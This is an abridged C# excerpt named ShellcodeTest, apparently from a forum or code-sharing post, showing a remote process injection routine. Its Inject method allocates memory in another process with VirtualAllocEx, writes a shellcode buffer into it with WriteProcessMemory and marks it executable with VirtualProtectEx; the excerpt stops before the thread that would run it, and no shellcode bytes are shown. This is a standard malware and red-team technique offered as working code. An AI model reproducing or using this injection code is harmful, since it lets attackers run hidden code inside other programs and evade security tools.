...
namespace ShellcodeTest
{
    public class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            Inject(x86, x64, pid);
            Thread.Sleep(100000); // Added sleep to allow assembly to run
        }
        ...
        public static int Inject(string x86, string x64, int procPID)
        {
            ...
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

            uint oldProt;
            bool prot = VirtualProtectEx(procHandle, allocMemAddress, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ, out oldProt); // Change if encoding used
